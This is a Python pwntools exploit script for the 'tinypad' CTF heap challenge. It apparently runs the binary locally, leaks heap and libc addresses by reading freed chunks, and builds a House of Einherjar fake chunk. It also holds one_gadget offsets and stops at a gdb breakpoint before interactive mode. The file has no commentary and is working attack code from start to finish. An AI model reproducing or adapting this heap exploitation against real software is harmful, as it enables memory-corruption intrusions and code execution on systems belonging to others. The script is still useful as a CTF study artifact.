from pwn import *
context(
	log_level='debug',
	binary='./tinypad'
)
e=context.binary
libc=e.libc
io=process()

#=========================================
#Function

def dbg(script=''):
	gdb.attach(io,gdbscript=script)

def menu(func):
	io.sendlineafter('(CMD)>>> ',str(func))

def add(size,content):
	menu('A')
	io.sendlineafter('(SIZE)>>> ',str(size))
	io.sendlineafter('(CONTENT)>>> ',str(content))

def delete(index):
	menu('D')
	io.sendlineafter('(INDEX)>>> ',str(index))

def edit(index,content):
	menu('E')
	io.sendlineafter('(INDEX)>>> ',str(index))
	io.sendlineafter('(CONTENT)>>> ',str(content))
	io.sendlineafter('(Y/n)>>> ',str('Y'))

#=========================================
#VAR
leak_libc_off = 3951480
one_gadget=[283158,283242,983716,987463]
tinypad_addr = 0x602040
global_max_fast_off = 3958776
#=========================================
add(0x10,'a'*0x10)
add(0x10,'b'*0x10)
add(0x100,'b'*0x10)
add(0x100,'b'*0x10)

delete(2)
delete(1)
delete(3)
io.recvuntil('CONTENT: ')
param = io.recvuntil('\x0a')
# print param[:4].encode('HEX')
heap = u64(param[:-1].ljust(8,'\x00'))
log.success('get heap addr: ' + hex(heap))
io.recvuntil('CONTENT: ')
io.recvuntil('CONTENT: ')
libc_leak = u64(io.recv(6).ljust(8,'\x00'))
log.success('libc_leak: ' + hex(libc_leak))
libc.address = libc_leak - leak_libc_off
log.success('libc.address: ' + hex(libc.address))
delete(4)

add(0x10, 'A' * 0x10)  # idx 0
# we would like trigger house of einherjar at idx 1
add(0x100, 'B' * 0xf8 + '\x11')  # idx 1


fake_addr=0x602040+0x20
size=heap-fake_addr+0x20
print hex(size)
payload="b"*0x20+p64(0)+p64(0x101)+p64(fake_addr)*2
# edit(3,payload)
add(0x100, payload)  # idx 2
add(0x100, 'D' * 0xf8)  #idx 3
delete(1)
add(0x18,'d'*0x10+p64(size))
dbg()
io.interactive()
